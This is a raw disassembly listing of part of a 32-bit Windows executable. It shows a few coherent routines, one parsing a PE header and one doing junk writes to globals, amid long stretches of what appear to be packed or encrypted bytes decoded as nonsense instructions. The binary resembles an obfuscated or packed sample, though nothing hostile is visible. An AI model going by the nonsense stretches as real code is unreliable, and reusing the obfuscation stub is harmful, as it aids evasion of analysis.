  411367:	clc    
  411368:	or     eax,0x406958e4
  41136d:	xor    eax,0x883d112c
  411372:	adc    DWORD PTR [edx+ebx*8+0x72],ecx
  411376:	mov    eax,0x1ef89699
  41137b:	addr16 sbb eax,0xe1e1d68a
  411381:	pop    es
  411382:	out    dx,eax
  411383:	inc    edx
  411384:	outs   dx,BYTE PTR ds:[esi]
  411385:	cld    
  411386:	add    eax,DWORD PTR [ebx+edx*2+0x41]
  41138a:	mov    ebp,0x3a6f974c
  41138f:	jne    0x411327
  411391:	ins    BYTE PTR es:[edi],dx
  411392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411393:	jne    0x4113ad
  411395:	inc    eax
  411396:	pusha  
  411397:	mov    edx,0x2edc7706
  41139c:	mov    bh,BYTE PTR [edi]
  41139e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41139f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113a0:	ret    0x3e21
  4113a3:	add    edi,DWORD PTR [edx+ecx*2+0x3c46540d]
  4113aa:	sub    eax,edx
  4113ac:	int    0x9a
  4113ae:	jg     0x4113ad
  4113b0:	pop    ebx
  4113b1:	(bad)  
  4113b2:	stc    
  4113b3:	imul   ecx,DWORD PTR [esp+eax*2-0x5e],0x12d38584
  4113bb:	lock sub al,0x82
  4113be:	das    
  4113bf:	in     al,dx
  4113c0:	cmp    eax,0x5198d083
  4113c5:	push   0x68d9c592
  4113ca:	(bad)  
  4113cb:	bound  ebx,QWORD PTR [edx+0x2b]
  4113ce:	(bad)  
  4113cf:	jno    0x411414
  4113d1:	inc    edx
  4113d2:	cld    
  4113d3:	test   eax,0xeff43872
  4113d8:	adc    DWORD PTR [ecx],ecx
  4113da:	or     BYTE PTR [edx+0x0],ch
  4113dd:	mov    eax,ds:0x8ab454d7
  4113e2:	rcl    BYTE PTR [eax-0x8f8b376],0x15
  4113e9:	stos   DWORD PTR es:[edi],eax
  4113ea:	jg     0x41136f
  4113ec:	mov    dl,0xe1
  4113ee:	push   gs
  4113f0:	call   0x6e71:0xa5c2f4f8
  4113f7:	jmp    0x41138a
  4113f9:	pop    ss
  4113fa:	xchg   BYTE PTR [ebx],cl
  4113fc:	push   edx
  4113fd:	push   ecx
  4113fe:	(bad)  
  4113ff:	inc    eax
  411400:	iret   
  411401:	add    BYTE PTR [edi-0x59],0xa4
  411405:	xchg   esi,eax
  411406:	int    0x1f
  411408:	fwait
  411409:	jmp    0x41143e
  41140b:	es pop ebp
  41140d:	mov    esi,0x3dd7c22f
  411412:	xchg   BYTE PTR [ebx+esi*2],dh
  411415:	retf   
  411416:	dec    ecx
  411417:	dec    ebp
  411418:	xchg   DWORD PTR [esi-0x3e2a5082],esi
  41141e:	jb     0x41148d
  411420:	xchg   ebp,eax
  411421:	(bad)  
  411422:	jmp    DWORD PTR [ecx+eiz*4]
  411425:	out    0x96,eax
  411427:	mov    ebp,fs
  411429:	shl    DWORD PTR [eax-0x61],cl
  41142c:	sbb    al,0x9d
  41142e:	and    ch,BYTE PTR [edi-0x55ddf391]
  411434:	test   BYTE PTR [ecx-0x38e02195],dl
  41143a:	jl     0x4113e1
  41143c:	push   eax
  41143d:	push   0x48
  41143f:	xor    esi,DWORD PTR [esi-0x44]
  411442:	push   edx
  411443:	adc    bh,bh
  411445:	pusha  
  411446:	out    0xd9,eax
  411448:	jo     0x4113fd
  41144a:	xchg   ebp,eax
  41144b:	cmc    
  41144c:	fild   QWORD PTR [ecx]
  41144e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41144f:	outs   dx,BYTE PTR ds:[esi]
  411450:	retf   0x1e08
  411453:	(bad)  
  411454:	call   0xfc77bf07
  411459:	mov    eax,ds:0x224be4c3
  41145e:	and    ch,BYTE PTR [eax]
  411460:	ret    0x24e3
  411463:	cs jmp 0x411460
  411466:	or     edi,DWORD PTR [esi-0x2]
  411469:	mov    edi,0xffb14228
  41146e:	push   ebp
  41146f:	in     eax,0x33
  411471:	lock out dx,eax
  411473:	retf   
  411474:	dec    ebx
  411475:	test   DWORD PTR [ebp-0x17],0xac8d92da
  41147c:	ret    0xd3d
  41147f:	lock mov dl,0xf5
  411482:	pop    esi
  411483:	push   esp
  411484:	pop    edx
  411485:	mov    eax,0xa69e394b
  41148a:	popa   
  41148b:	gs hlt 
  41148d:	cld    
  41148e:	adc    eax,0x8b7e6664
  411493:	fwait
  411494:	cmp    al,0xa7
  411496:	es inc ebp
  411498:	sbb    eax,0xe335345f
  41149d:	add    cl,cl
  41149f:	mov    dh,0xf5
  4114a1:	stos   BYTE PTR es:[edi],al
  4114a2:	mov    edi,0x4c130d7e
  4114a7:	retf   
  4114a8:	mov    WORD PTR [esi+ebp*4],ds
  4114ab:	and    eax,0xaa2fbdc4
  4114b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114b1:	jle    0x4114c2
  4114b3:	pop    esi
  4114b4:	mov    ds:0x101bba12,eax
  4114b9:	cmp    dl,al
  4114bb:	fsubr  DWORD PTR [edx-0x3e]
  4114be:	or     DWORD PTR [edx+0x3a1f81b3],ebp
  4114c4:	fsubr  DWORD PTR [edi-0x56]
  4114c7:	cmp    eax,0x247fd6c4
  4114cc:	inc    ebp
  4114cd:	xor    edi,DWORD PTR [esi+0x11]
  4114d0:	and    edi,DWORD PTR [esi+0x38]
  4114d3:	jbe    0x41150d
  4114d5:	data16 jle 0x411516
  4114d8:	mov    edi,0xdfd8f99d
  4114dd:	(bad)  
  4114de:	push   edx
  4114df:	jne    0x41146d
  4114e1:	ror    DWORD PTR [edx],cl
  4114e3:	jbe    0x41150f
  4114e5:	mov    edx,0x4ff64d5c
  4114ea:	popf   
  4114eb:	and    al,0x3c
  4114ed:	sub    al,0x1b
  4114ef:	jmp    0xeca6:0x54638ac6
  4114f6:	fneni(8087 only) 
  4114f8:	repnz stos BYTE PTR es:[edi],al
  4114fa:	inc    ebp
  4114fb:	and    BYTE PTR [ebp+0x23],dh
  4114fe:	inc    ebp
  4114ff:	(bad)  
  411500:	push   ecx
  411501:	dec    ebx
  411502:	(bad)  
  411503:	int    0x59
  411505:	outs   dx,BYTE PTR ds:[esi]
  411506:	push   cs
  411507:	cmp    ecx,DWORD PTR [ecx]
  411509:	nop
  41150a:	cld    
  41150b:	and    DWORD PTR [esi+eax*8-0x42ff79be],eax
  411512:	add    BYTE PTR [edi-0x55],bl
  411515:	sbb    eax,0xc0bd2008
  41151a:	jno    0x4114fd
  41151c:	popf   
  41151d:	icebp  
  41151e:	push   ss
  41151f:	dec    esp
  411520:	je     0x4114b6
  411522:	sbb    al,BYTE PTR [ebx-0x17f6c4e4]
  411528:	sub    ah,BYTE PTR [esi-0x60d3f600]
  41152e:	push   ds
  41152f:	jns    0x4114de
  411531:	popa   
  411532:	inc    esp
  411533:	fld    DWORD PTR [ebx+ebp*2+0x36b51ce3]
  41153a:	shr    DWORD PTR [ebx+0x6dfda18a],cl
  411540:	xchg   ecx,eax
  411541:	(bad)  
  411543:	pop    es
  411544:	mov    dh,0xa9
  411546:	lock in al,dx
  411548:	ror    DWORD PTR [ecx+0x52e6633f],0xfe
  41154f:	ja     0x411561
  411551:	mov    ?,WORD PTR [ebx]
  411553:	inc    ecx
  411554:	lods   eax,DWORD PTR ds:[esi]
  411555:	xchg   ebp,eax
  411556:	nop
  411557:	nop
  411558:	or     DWORD PTR [edi+0x3a],eax
  41155b:	dec    ebp
  41155c:	test   BYTE PTR [ecx-0x7d],al
  41155f:	aaa    
  411560:	pop    ebp
  411561:	jmp    0x411502
  411563:	call   0x856e4c6b
  411568:	not    BYTE PTR [ebx]
  41156a:	(bad)  
  41156c:	hlt    
  41156d:	out    0xb9,al
  41156f:	xchg   BYTE PTR [ecx-0x80],al
  411572:	pop    ecx
  411573:	push   edi
  411574:	push   0x46
  411576:	xor    ebx,ebp
  411578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411579:	sub    BYTE PTR [esi],dh
  41157b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41157c:	cmc    
  41157d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41157e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41157f:	lods   eax,DWORD PTR ds:[esi]
  411580:	aam    0x47
  411582:	shl    DWORD PTR [edx-0x68],1
  411585:	test   BYTE PTR [ebx],ah
  411587:	mov    eax,0xb3123c39
  41158c:	test   eax,0xdeb97a56
  411591:	ficom  DWORD PTR ds:0x4a51cb30
  411597:	les    ebx,FWORD PTR [edx+0xe4b343]
  41159d:	sub    eax,0xe28b51c1
  4115a2:	xor    esi,DWORD PTR [eax-0x79]
  4115a5:	or     BYTE PTR [ebx-0x885f5c6],ch
  4115ab:	sbb    ah,BYTE PTR [ebp+0xdcdaca4]
  4115b1:	rcr    BYTE PTR [edi],1
  4115b3:	pop    ss
  4115b4:	repz cmp al,BYTE PTR [ebp-0x74]
  4115b8:	jae    0x4115c1
  4115ba:	mov    dh,0xac
  4115bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115bd:	xor    dh,dl
  4115bf:	cmp    ebx,DWORD PTR [ebx]
  4115c1:	mov    bh,0xfe
  4115c3:	ins    BYTE PTR es:[edi],dx
  4115c4:	pop    ds
  4115c5:	or     dl,BYTE PTR [eax+0x2621099f]
  4115cb:	ret    
  4115cc:	mov    esi,0xaae360b2
  4115d1:	mov    bl,BYTE PTR [ecx+ebp*1]
  4115d4:	mov    edx,DWORD PTR [ebp+0x8]
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	stc    
  411619:	shr    DWORD PTR [edi+0x7e408635],1
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x4115b4
  411625:	pop    edx
  411626:	test   BYTE PTR [esi],al
  411628:	aad    0x57
  41162a:	xchg   ah,ch
  41162c:	adc    ecx,DWORD PTR [esi+esi*4]
  41162f:	inc    esp
  411630:	repz dec ebx
  411632:	popa   
  411633:	jmp    0xa70c1400
  411638:	fcom   st(7)
  41163a:	or     esi,0x85a109dd
  411640:	in     eax,0xb4
  411642:	dec    edi
  411643:	adc    edx,DWORD PTR [ebp+0x45]
  411646:	push   esp
  411647:	inc    edi
  411648:	xor    esp,DWORD PTR [esi]
  41164a:	retf   0xded8
  41164d:	mov    ds:0xc515c3a2,al
  411652:	xchg   ecx,eax
  411653:	ja     0x411642
  411655:	adc    eax,0xe08736a7
  41165a:	jno    0x41166e
  41165c:	adc    al,0x84
  41165e:	scas   eax,DWORD PTR es:[edi]
  41165f:	neg    BYTE PTR [ecx]
  411661:	push   ecx
  411662:	int3   
  411663:	ss in  al,dx
  411665:	loope  0x411601
  411667:	mov    ds:0xfdf7b13c,eax
  41166c:	inc    ebp
  41166d:	retf   0x1365
  411670:	cmp    BYTE PTR [esi+0x4c],cl
  411673:	xchg   esi,eax
  411674:	mov    al,0xe
  411676:	sbb    ch,BYTE PTR [edi+ebx*2-0x149fd982]
  41167d:	and    dl,BYTE PTR [ebp+0x1b]
  411680:	push   ds
  411681:	and    al,0xf4
  411683:	jo     0x41164e
  411685:	in     al,0x83
  411687:	ret    0x937e
  41168a:	xor    al,0x2f
  41168c:	or     DWORD PTR [eax-0x5],0xab439373
  411693:	xlat   BYTE PTR ds:[ebx]
  411694:	test   al,0xe1
  411696:	jbe    0x411710
  411698:	push   ss
  411699:	xor    DWORD PTR [ecx+0x9],edx
  41169c:	mov    gs,WORD PTR ds:0xbe4e9e4a
  4116a2:	xchg   ebx,eax
  4116a3:	ret    
  4116a4:	or     al,0x25
  4116a6:	(bad)  
  4116a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a9:	daa    
  4116aa:	pop    edi
  4116ab:	lods   eax,DWORD PTR ds:[esi]
  4116ac:	mov    dh,0xb7
  4116ae:	das    
  4116af:	and    BYTE PTR [eax+0x1d],dh
  4116b2:	mov    dh,ch
  4116b4:	cmp    bh,cl
  4116b6:	scas   al,BYTE PTR es:[di]
  4116b8:	dec    esp
  4116b9:	cs scas al,BYTE PTR es:[edi]
  4116bb:	imul   edi,ebp,0x5f6511fb
  4116c1:	mov    BYTE PTR [ebx+0x65baf82],al
  4116c7:	jno    0x4116e7
  4116c9:	leave  
  4116ca:	(bad)  
  4116cb:	jg     0x411706
  4116cd:	fmul   st(1),st
  4116cf:	jbe    0x411672
  4116d1:	push   ds
  4116d2:	call   0x7c90:0xc5b79e99
  4116d9:	mov    esi,0xbeb201db
  4116de:	(bad)  
  4116df:	aas    
  4116e0:	sub    BYTE PTR [eax+0x6a],bl
  4116e3:	inc    edx
  4116e4:	fist   DWORD PTR [ebp-0x7b6adb15]
  4116ea:	cld    
  4116eb:	inc    ecx
  4116ec:	imul   eax,DWORD PTR [edi+0x5acbed2f],0x12
  4116f3:	jl     0x4116bd
  4116f5:	lods   al,BYTE PTR ds:[esi]
  4116f6:	jbe    0x4116cd
  4116f8:	pop    ebp
  4116f9:	sub    al,0x57
  4116fb:	mov    ecx,0xd36edc7b
  411700:	sub    DWORD PTR [ebp-0x2f],esp
  411703:	mov    ch,0x4b
  411705:	inc    esp
  411706:	je     0x41169a
  411708:	lds    esi,FWORD PTR [eax-0x393c843c]
  41170e:	xor    bh,BYTE PTR [edx-0x7081cadd]
  411714:	and    bl,ah
  411716:	fst    QWORD PTR [edx]
  411718:	sbb    dh,bl
  41171a:	hlt    
  41171b:	push   ebp
  41171c:	push   edx
  41171d:	mov    edx,0xc271cd6f
  411722:	ss xchg ebp,eax
  411724:	test   al,0x60
  411726:	call   0x1e6ca8bc
  41172b:	jo     0x411745
  41172d:	jnp    0x411792
  41172f:	mov    ebp,0x6c6cb0a1
  411734:	test   al,0xff
  411736:	popa   
  411737:	push   edi
  411738:	pop    edx
  411739:	and    DWORD PTR [eax+0x4d451ff2],edx
  41173f:	xchg   ebp,eax
  411740:	lea    esp,[ecx]
  411742:	inc    BYTE PTR [eax+0x4a]
  411745:	es add eax,0xc1155886
  41174b:	loope  0x41174b
  41174d:	inc    eax
  41174e:	add    BYTE PTR [edx+0x4b],0x5
  411752:	sub    BYTE PTR [eax+0x18],bl
  411755:	dec    ecx
  411756:	push   ss
  411757:	push   esp
  411758:	in     eax,dx
  411759:	sahf   
  41175a:	xchg   ebp,eax
  41175b:	mov    edx,0x1f1cdd7
  411760:	in     eax,dx
  411761:	and    al,BYTE PTR [ebp-0x16]
  411764:	cmp    DWORD PTR [ecx],eax
  411766:	mov    ds:0xb44dd3eb,al
  41176b:	(bad)  
  41176c:	scas   al,BYTE PTR es:[edi]
  41176d:	mov    ebx,0xee0d734a
  411772:	xlat   BYTE PTR ds:[ebx]
  411773:	mov    eax,0x4fc9a24a
  411778:	(bad)  
  411779:	inc    ecx
  41177a:	xor    al,0x45
  41177c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41177d:	sbb    eax,DWORD PTR [edi]
  41177f:	jo     0x411764
  411781:	fldcw  WORD PTR [ecx+eiz*8-0x4e16d424]
  411788:	push   ecx
  411789:	jl     0x411715
  41178b:	add    DWORD PTR [edi+0x7c],ecx
  41178e:	(bad)  
  41178f:	(bad)  
  411790:	dec    ecx
  411791:	mov    bl,0x7a
  411793:	xor    DWORD PTR [eax+0x65db55a1],0xd
  41179a:	jp     0x411815
  41179c:	imul   BYTE PTR [ebx+ebp*4]
  41179f:	mov    bl,0xf2
  4117a1:	push   ebp
  4117a2:	jae    0x4117e8
  4117a4:	push   eax
  4117a5:	jp     0x4117a0
  4117a7:	mov    dl,0x8a
  4117a9:	shr    eax,0xc4
  4117ac:	mov    al,ds:0x93a03239
  4117b1:	mov    eax,0x7bf0f186
  4117b6:	sub    BYTE PTR [esi+0x446a0554],0x84
  4117bd:	pop    eax
  4117be:	adc    ecx,DWORD PTR [esi+0x3b]
  4117c1:	dec    ecx
  4117c2:	xchg   BYTE PTR [esi+0x1b],cl
  4117c5:	(bad)  
  4117c6:	jb     0x411773
  4117c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117c9:	inc    edi
  4117ca:	into   
  4117cb:	outs   dx,BYTE PTR ds:[esi]
  4117cc:	rcr    DWORD PTR [eax],1
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x433723,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x43367f,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43371f,0x433683
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43371f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43369b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43372b,0x0
  41182f:	mov    eax,ds:0x43372b
  411834:	inc    eax
  411835:	mov    ds:0x43372b,eax
  41183a:	cmp    DWORD PTR ds:0x43372b,0xb
  411841:	jne    0x411887
  411847:	push   0x43383c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43372b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43372b
  411899:	inc    eax
  41189a:	mov    ds:0x43372b,eax
  41189f:	cmp    DWORD PTR ds:0x43372b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	es cli 
  4118e9:	push   es
  4118ea:	fldcw  WORD PTR [esi+ecx*2]
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411964
  4118f4:	(bad)  
  4118f5:	mov    ch,0x83
  4118f7:	outs   dx,DWORD PTR ds:[esi]
  4118f8:	add    BYTE PTR [ecx-0x581a7d5a],dl
  4118fe:	shl    BYTE PTR [ecx+0x3575c7fb],cl
  411904:	sub    BYTE PTR ds:0x32734e83,0x24
  41190b:	call   0xc8a49a15
  411910:	ja     0x411928
  411912:	lds    edi,FWORD PTR [eax+0x3a]
  411915:	cmp    BYTE PTR [ebx-0x6a2c470a],dl
  41191b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41191c:	mov    BYTE PTR [eax+ebx*1-0x2802e6a2],cl
  411923:	les    esi,FWORD PTR [edx+0x45]
  411926:	mov    ah,0x34
  411928:	and    ebp,ebx
  41192a:	imul   ebx,DWORD PTR [ebp-0x3fa1463d],0xffffffae
  411931:	repnz sbb edi,0xffffff9d
  411935:	add    cl,cl
  411937:	cmp    bp,bp
  41193a:	das    
  41193b:	cs cli 
  41193d:	aam    0x22
  41193f:	pop    ecx
  411940:	xlat   BYTE PTR ds:[ebx]
  411941:	stc    
  411942:	adc    eax,0x3c0f7020
  411947:	and    al,0x87
  411949:	jle    0x411901
  41194b:	xor    al,0xa5
  41194d:	jno    0x4118f7
  41194f:	push   edi
  411950:	iret   
  411951:	bound  ebp,QWORD PTR [ebx]
  411953:	and    BYTE PTR [edi],ah
  411955:	repnz pop ds
  411957:	sahf   
  411958:	arpl   ax,cx
  41195a:	nop
  41195b:	sbb    BYTE PTR [eax],ah
  41195d:	or     esp,DWORD PTR [di+0x6]
  411961:	aaa    
  411962:	cmp    DWORD PTR [ebx],ebp
  411964:	sbb    esi,esp
  411966:	sbb    al,0x75
  411968:	mov    ch,0xd6
  41196a:	add    BYTE PTR [edx+0xc],bh
  41196d:	dec    esi
  41196e:	icebp  
  41196f:	push   0xffffffec
  411971:	(bad)  
  411972:	fnstcw WORD PTR ds:0xd0c6a396
  411978:	pop    esp
  411979:	test   DWORD PTR [eax+ebx*1+0x521789ac],0x72e1bfbe
  411984:	or     al,0x32
  411986:	push   cs
  411987:	mov    esp,0x64b76d97
  41198c:	mov    ds:0xf110ea42,eax
  411991:	loop   0x411926
  411993:	test   DWORD PTR [esi+0x43],esp
  411996:	jg     0x4119ef
  411998:	xchg   edi,eax
  411999:	jp     0x411996
  41199b:	call   0xe9e:0xc3bbf513
  4119a2:	xor    esp,0xffffffc5
  4119a5:	aas    
  4119a6:	mov    bh,0xa8
  4119a8:	mov    WORD PTR [ebx],gs
  4119aa:	push   ebx
  4119ab:	dec    edx
  4119ac:	mov    dl,0xd0
  4119ae:	push   es
  4119af:	loop   0x411954
  4119b1:	or     BYTE PTR [ecx],dh
  4119b3:	xor    eax,0xcd3342b3
  4119b8:	test   edx,ebp
  4119ba:	mov    esi,DWORD PTR [ebx*2+0x2757f473]
  4119c1:	add    al,0xf
  4119c3:	or     al,0xea
  4119c5:	test   al,0x3f
  4119c7:	push   ebx
  4119c8:	hlt    
  4119c9:	popa   
  4119ca:	fcom   QWORD PTR [ebx-0x39290e5]
  4119d0:	test   ecx,ebp
  4119d2:	mov    bh,0x58
  4119d4:	ror    DWORD PTR [esi+0x17],1
  4119d7:	pop    ebp
  4119d8:	xchg   esi,eax
  4119d9:	out    0xe1,al
  4119db:	cmp    eax,0x8adb9965
  4119e0:	mov    edi,0xd0557e15
  4119e5:	dec    edx
  4119e6:	xchg   edx,eax
  4119e7:	add    al,0xc
  4119e9:	fist   DWORD PTR [eax-0x26]
  4119ec:	jb     0x4119ca
  4119ee:	in     al,0x37
  4119f0:	mov    edi,0x30bb9e48
  4119f5:	fs inc ecx
  4119f7:	adc    bl,al
  4119f9:	retf   
  4119fa:	mov    esp,edi
  4119fc:	dec    eax
  4119fd:	ins    BYTE PTR es:[edi],dx
  4119fe:	add    eax,0x979a2e46
  411a03:	mov    DWORD PTR [esi],ebp
  411a05:	shl    DWORD PTR [ebx-0x3e],cl
  411a08:	sub    eax,0xa4bde7f3
  411a0d:	or     eax,0x69087c26
  411a12:	adc    ecx,ecx
  411a14:	out    dx,eax
  411a15:	xchg   edi,eax
  411a16:	and    esi,DWORD PTR [ebp+eax*8+0x45]
  411a1a:	mov    ebp,0x2c41dc98
  411a1f:	mov    esi,0x6159ced1
  411a24:	pop    esp
  411a25:	mov    dl,0xd6
  411a27:	push   es
  411a28:	and    al,BYTE PTR [ebx-0x79]
  411a2b:	cs mov esi,eax
  411a2e:	in     eax,dx
  411a2f:	lods   al,BYTE PTR ds:[esi]
  411a30:	xchg   ebp,eax
  411a31:	xor    cl,BYTE PTR [eax+ebp*1-0x49]
  411a35:	in     eax,0x3a
  411a37:	xor    DWORD PTR [eax-0x53],esi
  411a3a:	pop    edx
  411a3b:	addr16 push esp
  411a3d:	sbb    BYTE PTR [esi+0x4405703],dl
  411a43:	in     al,0x3b
  411a45:	loop   0x411a4a
  411a47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a48:	cli    
  411a49:	mov    cl,BYTE PTR [ebx+0x3b]
  411a4c:	adc    BYTE PTR [ebp-0x6cb4b183],ah
  411a52:	jge    0x4119f4
  411a54:	sub    cl,BYTE PTR [edi+0x232d663b]
  411a5a:	fld    st(4)
  411a5c:	add    ah,BYTE PTR [edi-0x7e]
  411a5f:	repnz cmp ah,BYTE PTR [ebx+0x117ea87a]
  411a66:	mov    edi,0x6c1ead38
  411a6b:	xchg   ebp,eax
  411a6c:	rcl    BYTE PTR [ebx+eiz*4],1
  411a6f:	jmp    0xb40cad31
  411a74:	cli    
  411a75:	pop    esp
  411a76:	xchg   edx,eax
  411a77:	adc    esi,DWORD PTR [eax]
  411a79:	iret   
  411a7a:	cmp    dh,BYTE PTR [edi+0xdc6aed5]
  411a80:	add    BYTE PTR [ecx],dl
  411a82:	fst    DWORD PTR [ecx+ebx*4-0x486f86dc]
  411a89:	pop    ecx
  411a8a:	xchg   esp,eax
  411a8c:	mov    ?,WORD PTR [edi*1-0x7d26e23b]
  411a93:	stos   BYTE PTR es:[edi],al
  411a94:	xor    BYTE PTR [ebx],cl
  411a96:	cld    
  411a97:	je     0x411a52
  411a99:	mov    edx,0x307ea32
  411a9e:	shr    ecx,0xd
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
